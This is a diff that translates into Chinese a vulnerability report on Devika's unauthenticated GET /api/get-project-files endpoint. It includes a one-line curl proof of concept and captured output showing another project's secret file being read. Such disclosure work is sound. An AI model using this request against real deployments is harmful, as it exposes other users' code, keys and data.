@@ -1,19 +1,24 @@
-# F-H-PROJFILES-1: Cross-project file read
+# Devika：未认证跨项目文件读取（GET /api/get-project-files）
 
-**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
+## 描述
 
-## Description
-`GET /api/get-project-files` in `src/project.py:148-174` walks any existing project directory and returns every readable file's full text with no ownership binding.
+`GET /api/get-project-files`（src/project.py:148-174）按 `project_name` 参数遍历 `data/projects/<name>/` 目录并返回每个可读文件的完整内容，无认证、无项目属主绑定——项目名即可枚举猜测。
 
-## Impact
-Unauthenticated client reads other projects' files.
+## 影响
+
+任何能访问 1337 端口的网络客户端读取其他项目的全部源码/数据文件（项目目录中可能含 .env、密钥、内部代码）。
 
 ## PoC
+
 ```bash
-curl "http://<host>:1337/api/get-project-files?project_name=victim-project"
+# 前提：存在受害者项目 data/projects/victim-project/SECRET.txt（内容 "victim secret data 42"）
+curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
 ```
 
-## Execution result
+## 执行结果
+
 ```
-[PROJFILES] {"files":[{"code":"victim secret data 42\n","file":"SECRET.txt"}]}
+$ curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
+{"files":[{"code":"victim secret data 42\n","file":"SECRET.txt"}]}
+[GET variant HTTP 200]
 ```
